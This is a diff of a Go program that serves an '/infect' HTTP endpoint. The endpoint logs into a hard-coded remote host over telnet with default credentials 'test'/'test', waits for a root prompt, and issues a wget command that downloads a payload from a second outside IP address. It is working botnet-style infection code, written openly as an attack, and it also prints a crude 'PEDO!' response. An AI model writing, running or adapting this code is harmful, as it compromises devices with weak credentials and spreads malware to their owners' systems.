@@ -1,73 +1,54 @@
 package main
 
 import (
-        "io"
-        "net/http"
-        "telnet"
-        "log"
-        "os"
-        "time"
+	"io"
+	"net/http"
+	"telnet"
+	"log"
+	"time"
 )
 
 const timeout = 10 * time.Second
 
 func checkErr(err error) {
-        if err != nil {
-                log.Fatalln("Error:", err)
-        }
+	if err != nil {
+		log.Fatalln("Error:", err)
+	}
 }
 
 func expect(t *telnet.Conn, d ...string) {
-        checkErr(t.SetReadDeadline(time.Now().Add(timeout)))
-        checkErr(t.SkipUntil(d...))
+	checkErr(t.SetReadDeadline(time.Now().Add(timeout)))
+	checkErr(t.SkipUntil(d...))
 }
 
 func sendln(t *telnet.Conn, s string) {
-        checkErr(t.SetWriteDeadline(time.Now().Add(timeout)))
-        buf := make([]byte, len(s)+1)
-        copy(buf, s)
-        buf[len(s)] = '\n'
-        _, err := t.Write(buf)
-        checkErr(err)
+	checkErr(t.SetWriteDeadline(time.Now().Add(timeout)))
+	buf := make([]byte, len(s)+1)
+	copy(buf, s)
+	buf[len(s)] = '\n'
+	_, err := t.Write(buf)
+	checkErr(err)
 }
 
-type NoListFile struct {
-        http.File
-}
-
-func (f NoListFile) Readdir(count int) ([]os.FileInfo, error) {
-        return nil, nil
-}
-
-type NoListFileSystem struct {
-        base http.FileSystem
-}
-
-func (fs NoListFileSystem) Open(name string) (http.File, error) {
-        f, err := fs.base.Open(name)
-        if err != nil {
-                return nil, err
-        }
-        return NoListFile{f}, nil
-}
 
 func infect(w http.ResponseWriter, r *http.Request) {
-        io.WriteString(w, "PEDO!")
-        dst_ip := "212.237.16.229"
-        dst := dst_ip+":23"
-
-        //var data []byte
-        t, err := telnet.Dial("tcp", dst)
-        checkErr(err)
-        t.SetUnixWriteMode(true)
-        user := "test"
-        passwd := "test"
-        expect(t, "login: ")
-        sendln(t, user)
-        expect(t, "ssword: ")
-        sendln(t, passwd)
-        expect(t, "$")
-        sendln(t, "ls -l")
+	io.WriteString(w, "PEDO!")
+	dst_ip := "212.237.16.229"
+	dst := dst_ip+":23"
+	
+	//var data []byte	
+	t, err := telnet.Dial("tcp", dst)
+	checkErr(err)
+	t.SetUnixWriteMode(true)
+	user := "test" 
+	passwd := "test"
+	expect(t, "login: ")
+	sendln(t, user)
+	expect(t, "ssword: ")
+	sendln(t, passwd)
+	expect(t, "#")
+	sendln(t, "wget http://217.182.206.115:8080/payload")
+	expect(t, "#")
 
 }
 func hello1(w http.ResponseWriter, r *http.Request) {
@@ -75,9 +56,7 @@ func hello1(w http.ResponseWriter, r *http.Request) {
 }
 
 func main() {
-        mux := http.NewServeMux()
-        mux.HandleFunc("/infect", infect)
-        http.ListenAndServe(":8000", mux)
-        http.ListenAndServe(":8080", http.FileServer(http.Dir(".")))
+	mux := http.NewServeMux()
+	mux.HandleFunc("/infect", infect)
+	http.ListenAndServe(":8000", mux)
 }
-
